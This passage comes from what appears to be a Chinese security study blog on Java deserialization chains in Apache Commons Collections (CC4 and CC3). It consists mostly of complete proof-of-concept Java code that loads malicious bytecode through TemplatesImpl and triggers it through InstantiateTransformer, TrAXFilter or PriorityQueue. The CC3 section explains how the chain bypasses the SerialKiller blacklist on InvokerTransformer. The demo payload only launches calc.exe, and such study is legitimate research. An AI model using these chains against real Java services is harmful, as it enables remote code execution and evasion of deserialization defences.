class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译就行</p><p>当然 也可以直接来调用这个类</p><p>我们还是用这个恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//用Exception免得边写边加报错类型</span></span><br><span class="line">        <span class="comment">//将恶意类转换为字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;com.test.evilClass&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> (TemplatesImpl) constructor.newInstance();</span><br><span class="line">        <span class="comment">//将恶意类的字节码设置给_bytecodes属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//设置属性_name为恶意类名</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates , <span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransform=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        TransformingComparator transformingComparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransform);</span><br><span class="line">        PriorityQueue queue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//入队两个元素，之后通过反射替换掉</span></span><br><span class="line">        Field comparator=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(queue,transformingComparator);</span><br><span class="line">        <span class="comment">//将优先队列的比较器设置为transforminComparator</span></span><br><span class="line">        Field fieldQueue=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        fieldQueue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldQueue.set(queue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;chainedTransform,chainedTransform&#125;);</span><br><span class="line">        <span class="comment">//将两个chainedTransform入队，在触发比较器后就会调用transform方法</span></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化--CC3</title>
      <link href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3/"/>
      <url>/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3/</url>
      
        <content type="html"><![CDATA[<h1 id="java反序列化–CC3"><a href="#java反序列化–CC3" class="headerlink" title="java反序列化–CC3"></a>java反序列化–CC3</h1><p>我们知道 <code>TemplatesImpl</code>可以加载字节码的类 通过<code>newTransformer()</code> 方法 可以执行这段字节码的类构造器</p><p>这其实就是CC3</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>CC1的demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;) <span class="comment">// Windows下的计算器命令，根据实际情况调整</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发执行链</span></span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合<code>TemplatesImpl</code> 可以执行字节码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line"><span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">    <span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123; code &#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure><p>我们只需要结合这两段POC，即可很容易地改造出⼀个执行任意字节码的CommonsCollections利用链：<strong>只需要将第一个demo中InvokerTransformer执行的“方法”改成<code>TemplatesImpl::newTransformer()</code></strong> </p><p>即</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以完整的POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsIntro2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">            <span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/66630a3cdfe9a.png" alt="image-20240602171150398"></p><p>可以执行字节码</p><h2 id="CC3–demo"><a href="#CC3–demo" class="headerlink" title="CC3–demo"></a>CC3–demo</h2><p>如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsIntro2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">            <span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比后发现其实就改了一点：</p><p>将</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>改成：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>这其实是根据看<code>ysoserial</code>的代码写出来的demo</p><p>对比发现demo其实就是没有用到<code>InvokerTransformer</code></p><p>为什么呢</p><p>2015年出现了java反序列化的攻击工具<code>ysoserial</code> 后续自然也出了相应的防御工具–<a href="https://github.com/ikkisoft/SerialKiller">SerialKiller</a>用于过滤方法</p><p><code>SerialKiller</code>是⼀个Java反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的黑名单</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3ab8d2a.png" alt="image-20240602174038537"></p><p>我们可以看到 过滤了<code>InvokerTransformer</code></p><p>也就切断了CommonsCollections1的利⽤链</p><p>而我们原本的CC3也是基于CC1来的 自然也被过滤了</p><p>有攻就有防 <code>ysoserial</code>自然也就进行了升级 其中就包括CommonsCollections3</p><p>CommonsCollections3的目的很明显，就是为了<strong>绕过一些规则对InvokerTransformer的限制</strong>。 </p><p>CommonsCollections3并没有使用到InvokerTransformer来调用任意方法，而是用到了另⼀个类， <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 。</p><p>这个类的构造方法中调用了 <code>(TransformerImpl) templates.newTransformer()</code> ，免去了我们使用 